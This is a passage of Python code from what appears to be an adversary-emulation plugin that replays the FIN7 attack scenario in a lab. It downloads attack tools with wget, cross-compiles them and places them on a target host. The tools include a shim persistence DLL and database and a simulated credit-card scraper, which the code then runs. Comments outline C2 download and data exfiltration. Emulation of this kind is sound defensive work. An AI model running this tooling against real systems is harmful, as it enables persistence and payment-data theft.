        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; wget {dl_uris[2]}")

        # Compiling dll 329
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; rm {filename};")
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; i686-w64-mingw32-g++ -m32 -shared -municode -D UNICODE -D _UNICODE -fpermissive dllmain.cpp pe.cpp -L/usr/i686-w64-mingw32/lib/ -l:libntoskrnl.a -l:libntdll.a -o {filename}")
        self.attack_logger.stop_build(logid=logid)

        # ## sdbE376.tmp
        dl_uri = "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/fin7/Resources/Step9/sdbE376.tmp"
        filename = "sdbE376.tmp"
        logid = self.attack_logger.start_build(dl_uri=dl_uri,
                                               filename=filename,
                                               for_step=9,
                                               comment="An SDB Shim database file. Will be installed for application shimming.")
        # Just download https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/fin7/Resources/Step9/sdbE376.tmp
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; rm {filename}")
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; wget {dl_uri}")

        self.attack_logger.stop_build(logid=logid)

        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Step 9 compiling tools{CommandlineColors.ENDC}", 1)

    def step9(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 9 (target: accounting): Setup Shim Persistence{CommandlineColors.ENDC}", 1)
        self.attack_logger.start_narration(
            "Step 9 (target accounting): Setup Shim Persistence\n----------------------------")
        self.attack_logger.start_narration("""
NOT IMPLEMENTED YET

* powershell.exe executes base64 encoded commands (Caldera ?)
* Downloads dll329.dll and sdbE376
* persistence: sdbinst.exe installs sdbE376.tmp for application shimming https://attack.mitre.org/techniques/T1546/011/
""")

        # This is meterpreter !

        # powershell.exe executes base64 encoded commands (Caldera ?)
        # Downloads dll329.dll and sdbE376
        # persistence: sdbinst.exe installs sdbE376.tmp for application shimming https://attack.mitre.org/techniques/T1546/011/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 9: Setup Shim Persistence{CommandlineColors.ENDC}", 1)

    def build_step10(self):
        """ Builds the tools required for step 10

        :return:
        """

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 10 compiling tools{CommandlineColors.ENDC}", 1)

        accounting = self.get_target_by_name("accounting")

        # Compiling

        # i686-w64-mingw32-gcc is for 32 bit
        # x86_64-w64-mingw32-gcc is for 64 bit

        # Important: pillowMint is not very complex and looks for the data at a fixed address. As we a re-compiling AccountIQ.exe and the data address does not match the expected one we will just get garbage.

        filename = "AccountingIQ.exe"
        dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/AccountingIQ.c"
        logid = self.attack_logger.start_build(
                                               filename=filename,
                                               for_step=10,
                                               dl_uri=dl_uri,
                                               comment="This is a simulated credit card tool to target. The final flag is in here.")
        # simulated credit card tool as target
        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_10")  # MSFVenom needs to be installed
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_10; rm {filename}")
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_10; rm AccountingIQ.c; wget {dl_uri}")
        self.attacker_machine_plugin.remote_run(
            f"cd tool_factory/step_10; i686-w64-mingw32-gcc -m32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include AccountingIQ.c -o {filename}")

        self.attacker_machine_plugin.get(f"tool_factory/step_10/{filename}",
                                         os.path.join(os.path.dirname(self.plugin_path), "resources", "step10",
                                                      filename))
        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", filename),
                       filename)

        self.attack_logger.stop_build(logid=logid)

        # Simulated credit card scraper

        filename = "pillowMint.exe"
        dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/pillowMint.cpp"
        logid = self.attack_logger.start_build(
            filename=filename,
            for_step=10,
            dl_uri=dl_uri,
            comment="This is a simulated credit card data scraper.")
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_10; rm {filename}")
        self.attacker_machine_plugin.remote_run(
            f"cd tool_factory/step_10; rm pillowMint.cpp; wget {dl_uri}")
        self.attacker_machine_plugin.remote_run(
            f"cd tool_factory/step_10; x86_64-w64-mingw32-g++ -static pillowMint.cpp -o {filename}")
        self.attacker_machine_plugin.get(f"tool_factory/step_10/{filename}",
                                         os.path.join(os.path.dirname(self.plugin_path), "resources", "step10",
                                                      filename))

        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", filename),
                       filename)
        self.attack_logger.stop_build(logid=logid)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}Step 10 compiling tools{CommandlineColors.ENDC}", 1)

    def step10(self):

        accounting = self.get_target_by_name("accounting")

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 10 (target: accounting): Steal Payment Data{CommandlineColors.ENDC}", 1)
        self.attack_logger.start_narration(
            "Step 10 (target accounting): Steal Payment Data\n----------------------------")
        self.attack_logger.start_narration("""
NOT IMPLEMENTED YET. NEEDS TARGET REBOOTING: NO IDEA IF ATTACKX CAN SUPPORT THAT

* Machine is rebooted
* shim dll329.dll is activated https://attack.mitre.org/techniques/T1546/011/
* AccountingIQ injects into SyncHost.exe, rundll32.exe communicates to C2
* debug.exe(pillowMint.exe) is downloaded from C2, does process discovery https://attack.mitre.org/techniques/T1105/
* send 7za.exe to target. Zip stolen data, exfiltrate
""")

        # This is meterpreter !

        # Scenario target is the fake payment application AccountingIQ.exe

        # TODO: Machine is rebooted
        # TODO: shim dll329.dll is activated https://attack.mitre.org/techniques/T1546/011/
        # TODO: AccountingIQ injects into SyncHost.exe, rundll32.exe communicates to C2
        # TODO: debug.exe(pillowMint.exe) is downloaded from C2, does process discovery https://attack.mitre.org/techniques/T1105/
        # TODO: send 7za.exe to target. Zip stolen data, exfiltrate

        accounting.remote_run("AccountingIQ.exe", disown=True)
        time.sleep(1)
        accounting.remote_run("pillowMint.exe", disown=False)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 10: Steal Payment Data{CommandlineColors.ENDC}", 1)

    def install(self):
        """ Install tools for the attack. Here those are especially build tools """

        self.attacker_machine_plugin.remote_run("mkdir tool_factory")  # MSFVenom needs to be installed
        self.attacker_machine_plugin.remote_run("sudo apt -y install msfpc")  # MSFVenom needs to be installed
        self.attacker_machine_plugin.remote_run("sudo apt -y install g++-mingw-w64")  # Cross compiler
        self.attacker_machine_plugin.remote_run("sudo apt -y install mingw-w64")  # Cross compiler
        self.attacker_machine_plugin.remote_run("sudo apt -y install powershell")  # Microsoft powershell
        self.attacker_machine_plugin.remote_run("sudo apt -y install g++-multilib libc6-dev-i386")  # 32 bit support
        self.attacker_machine_plugin.remote_run("cd tool_factory; git clone https://github.com/monoxgas/sRDI")  # To generate PIC
        # putting own insert_shellcode too to attacker
        self.attacker_machine_plugin.put(
            os.path.join(self.main_path(), "tools", "insert_shellcode.py"), os.path.join("tool_factory", "insert_shellcode.py"))

        #  self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"),
        #               "pillowMint.exe")

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets
        """

        # Those build calls will be called from the steps directly. But it is always conveniet for testing to use that now directly while developing
        # Building the tools is temporarily de-activated. Without the proper environment the tools being built are useless. Many attacks run on temporary attacks
        if True:
            self.build_step4()  # DONE
            self.build_step6()  # DONE
            # TODO: self.build_step7()  # Will not be done until the environment is planned. This step needs Aloha Command Center on the target. Maybe we write our own vulnerable app....

            self.build_step9()

            self.build_step10()  # DONE

        self.step1()
        self.step2()
        self.step3()  # DONE and works
        self.step4()  # PARTIAL - with a hack. Needs compilation of babymetal: Needs a powershell to execute on the build system. And this one needs system access
        self.step5()  # DONE and quite ok
        self.step6()  # Hollow.exe has to be generated
        self.step7()  # Will need compilation of an attack tool Boostwrite
        self.step8()  # Migration and credential collection, on itadmin
        self.step9()  # on accounting, shim persistence bin329.tmp needs to be generated
        self.step10()  # on accounting, AccountingIQ.c needs compilation. But just once.

        return ""
